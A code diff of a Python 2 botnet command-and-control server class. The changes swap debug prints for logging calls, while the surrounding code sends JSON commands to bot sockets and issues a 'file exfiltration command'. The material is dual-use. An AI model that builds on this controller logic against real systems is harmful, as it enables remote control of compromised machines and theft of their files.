@@ -20,19 +20,21 @@ class ServerCMD(core.ServerCMD):
         self.logger.debug('send command to bots')
         sock_num = len(self.node.client_socks)
         if not bots: bots = range(sock_num)
+        print 'sock_num', sock_num
+        print 'broke_socks', broke_socks
         client_socks = self.node.client_socks
 
         new_broke_socks = []
-        print 'bots, ', bots
+        self.logger.debug('cmd [%s] will be send to bots: [%s]'%(str(cmd), str(bots)))
         for bot_id in bots:
             if bot_id in broke_socks:
                 continue
             client_sock = client_socks[bot_id]
-            print 'client_sock get, ', type(client_sock)
             try:
-                self.logger.debug('start')
+                print 'result, ', self._dump_json(cmd)
                 self.node.send(client_sock, self._dump_json(cmd))
-                self.logger.debug('end')
+                # self.node.send(client_sock, 'connect_ack')
+                # print 'self.node.send finished'
             except IOError:
                 self.logger.info('sock has been closed, cannot send command, \
                         you have lost control over this bot')
@@ -46,7 +48,6 @@ class ServerCMD(core.ServerCMD):
         command:
         """
         self.logger.info('start to issue file exfiltration command')
-        print 'file_exfiltration data, ', data
         bots = data.get('bots', None)
 
         # for client_sock in self.node.client_socks:
@@ -62,6 +63,7 @@ class ServerCMD(core.ServerCMD):
         broke_socks = self.send_cmd_to_bots(cmd, broke_socks)
 
         self.node.close_socks(broke_socks, 'client')
+        self.logger.debug('broke_socks %s'%(str(broke_socks)))
 
 
 
